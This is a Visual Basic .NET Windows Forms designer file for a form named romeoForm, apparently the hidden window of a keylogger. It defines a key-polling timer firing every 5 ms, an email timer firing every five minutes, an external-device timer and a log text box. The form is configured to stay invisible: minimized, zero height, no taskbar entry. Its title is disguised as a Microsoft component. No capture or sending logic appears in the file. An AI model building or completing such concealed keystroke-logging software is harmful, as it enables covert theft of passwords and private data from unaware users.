﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class romeoForm
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(romeoForm))
        Me.tmrEmail = New System.Windows.Forms.Timer(Me.components)
        Me.tmrKey = New System.Windows.Forms.Timer(Me.components)
        Me.txtLogs = New System.Windows.Forms.TextBox()
        Me.ExtDevice = New System.Windows.Forms.Timer(Me.components)
        Me.SuspendLayout()
        '
        'tmrEmail
        '
        Me.tmrEmail.Enabled = True
        Me.tmrEmail.Interval = 300000
        '
        'tmrKey
        '
        Me.tmrKey.Enabled = True
        Me.tmrKey.Interval = 5
        '
        'txtLogs
        '
        Me.txtLogs.AccessibleName = ""
        Me.txtLogs.Location = New System.Drawing.Point(1, 1)
        Me.txtLogs.Multiline = True
        Me.txtLogs.Name = "txtLogs"
        Me.txtLogs.Size = New System.Drawing.Size(221, 130)
        Me.txtLogs.TabIndex = 0
        '
        'ExtDevice
        '
        Me.ExtDevice.Enabled = True
        Me.ExtDevice.Interval = 10
        '
        'romeoForm
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(124, 0)
        Me.Controls.Add(Me.txtLogs)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "romeoForm"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide
        Me.Text = "Microsoft.$safeprojectname$"
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents tmrEmail As System.Windows.Forms.Timer
    Friend WithEvents tmrKey As System.Windows.Forms.Timer
    Friend WithEvents txtLogs As System.Windows.Forms.TextBox
    Friend WithEvents ExtDevice As System.Windows.Forms.Timer

End Class
